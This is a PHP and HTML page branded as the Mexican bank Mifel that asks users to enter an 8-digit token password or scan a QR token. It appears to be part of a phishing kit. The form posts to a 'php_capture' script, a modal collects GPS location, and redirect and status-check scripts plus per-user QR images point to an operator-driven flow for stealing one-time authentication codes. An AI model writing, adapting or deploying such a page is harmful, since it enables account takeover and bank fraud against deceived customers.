<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: personas.html');
    exit;
}

require_once __DIR__ . '/php_config/conexionbd.php';
require_once __DIR__ . '/php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/php_config/gps_helpers.php';
require_once __DIR__ . '/includes/gps_aviso_modal.php';

$pdo = conectarBD();
$usuarioId = (int) $_SESSION['usuario_id'];
$usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);
$avance = tokenPantallaEvaluarAvance($pdo, $usuarioId);

$rutas = tokenPantallaRutas($usuario);
$destinoFormulario = $rutas['formulario'] ?? 'formReg-exectution.php';

if (!$usuario || !tokenPantallaEsPersona($usuario)) {
    header('Location: ' . ($rutas['login'] ?? 'personas.html'));
    exit;
}

if (!$avance['puede_avanzar']) {
    header('Location: ' . $rutas['validando']);
    exit;
}

if (!empty($avance['omitir_token'])) {
    header('Location: ' . $destinoFormulario);
    exit;
}

if (!$usuario || !tokenPantallaRequiereCapturaToken($usuario)) {
    header('Location: ' . $destinoFormulario);
    exit;
}

$modoQr = ($usuario['token_pantalla_modo'] ?? 'normal') === 'qr';
$imagenQr = trim($usuario['token_qr_imagen_url'] ?? '');

$error = $_SESSION['token_error'] ?? '';
unset($_SESSION['token_error']);

$mostrarModalGps = gpsUsuarioNecesitaCaptura($pdo, $usuarioId);

require_once __DIR__ . '/includes/personas_token_assets.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autoriza con tu token - Acceso</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/feLinicio.css">
    <link rel="stylesheet" href="css/_responsivefel.css">
    <link rel="stylesheet" href="css/gps.css">
    <link rel="stylesheet" href="css/token-pantalla.css">
    <link rel="stylesheet" href="empresas/css/token-pagina-qr.css?v=20260714">
    <link rel="stylesheet" href="php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="php_modales/css/herramientas.css">
    <link rel="stylesheet" href="php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="php_modales/css/email_validate.css">
    <link rel="stylesheet" href="css/zeppelin_churro_btn.css">
    <?php gpsAvisoModalAssets($mostrarModalGps); ?>
    <?php personas_token_assets_head(); ?>
    <?php require_once __DIR__ . '/includes/responsive_movil.php'; mifel_responsive_movil_assets('gps-flujo'); ?>
</head>
<body class="<?= $modoQr ? 'token-pagina-qr' : '' ?>">
    <header class="header-container">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="images/logo_mifel_hd.svg" alt="Mifel" class="mifel-header-logo">
            </div>
            <div class="language-dropdown">
                <img src="images/Flag_mx2.svg" alt="México" class="flag-icon">
                <span class="language-text">ES</span>
                <img src="images/drop_down.png" alt="dropdown" class="dropdown-arrow">
            </div>
        </div>
    </header>

    <main class="gps-container">
        <div class="gps-content">
            <?php if ($modoQr && $imagenQr !== ''): ?>
            <div class="token-qr-page-content">
                <h1 class="token-qr-page-title">Autoriza con tu token</h1>
                <p class="token-qr-page-description">Escanea el código e ingresa la contraseña token.</p>
                <span class="token-qr-page-help">¿Cómo escanear el código?</span>
                <div class="token-qr-page-image-wrap">
                    <img src="<?= htmlspecialchars($imagenQr, ENT_QUOTES, 'UTF-8') ?>" alt="Código QR token" class="token-qr-page-image" loading="lazy">
                </div>
                <div class="token-qr-page-timer">
                    <span class="token-qr-page-timer-dot" aria-hidden="true"></span>
                    <span>El código cambiará en 3 minutos</span>
                </div>
                <hr class="token-qr-page-divider">
            </div>
            <?php else: ?>
            <h1 class="gps-title">Autoriza con tu token</h1>
            <p class="token-description">
                Ingresa la contraseña de 8 dígitos que se genera en tu dispositivo token
            </p>
            <?php endif; ?>

            <form class="token-form" action="php_capture/token_personas.php" method="POST" novalidate>
                <div class="token-input-row">
                    <div class="token-field">
                        <label for="token_codigo" class="token-label">Contraseña token</label>
                        <input
                            type="password"
                            id="token_codigo"
                            name="token_codigo"
                            class="token-input<?= $error !== '' ? ' is-invalid' : '' ?>"
                            maxlength="8"
                            inputmode="numeric"
                            pattern="[0-9]{8}"
                            autocomplete="one-time-code"
                            required
                            oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                        >
                        <?php if ($error !== ''): ?>
                        <span class="token-error" role="alert"><?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?></span>
                        <?php endif; ?>
                    </div>
                    <button type="submit" class="token-submit">Autorizar</button>
                </div>
            </form>

            <a href="authenticate-execution.php?reiniciar=1" class="token-back">Volver</a>
        </div>
    </main>

    <?php if ($mostrarModalGps) {
        gpsAvisoModalMarkup('php_capture/gps_login_empresas.php', 'images/gps.png', 'empresas/images/login-spinner.svg');
    } ?>

    <script src="php_modales/js/check_status.js"></script>
    <script src="php_modales/js/modales_input_no_input.js"></script>
    <script src="php_modales/js/herramientas.js"></script>
    <script src="php_modales/js/reloj_personalizado.js"></script>
    <script src="php_modales/js/redirecciones.js"></script>
    <script src="php_modales/js/email_validate_handler.js"></script>
    <?php if ($mostrarModalGps): ?>
    <script src="js/gps_login_modal.js?v=20260806"></script>
    <?php endif; ?>
    <?php personas_token_assets_scripts(); ?>
</body>
</html>
